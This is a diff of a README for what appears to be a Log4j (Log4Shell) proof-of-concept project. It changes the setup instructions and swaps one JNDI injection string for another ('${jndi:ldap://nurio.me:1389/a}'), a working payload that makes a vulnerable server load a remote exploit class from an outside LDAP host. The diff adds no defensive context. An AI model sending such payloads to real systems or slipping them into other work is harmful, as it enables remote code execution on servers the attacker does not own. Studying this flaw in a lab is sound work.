@@ -39,7 +39,7 @@ public class Log4j {
 
 ## Vulnerable message example
 
-You will need to replace the `nurio.me` domain to your web server storing the exploit class (`Magic.class` for this example)
+You will need to replace the `nurio.me` domain to your LDAP server, for local development it could be `localhost`.
 ```
-${jndi:ldap://nurio.me/l4s/a}
+${jndi:ldap://nurio.me:1389/a}
 ```
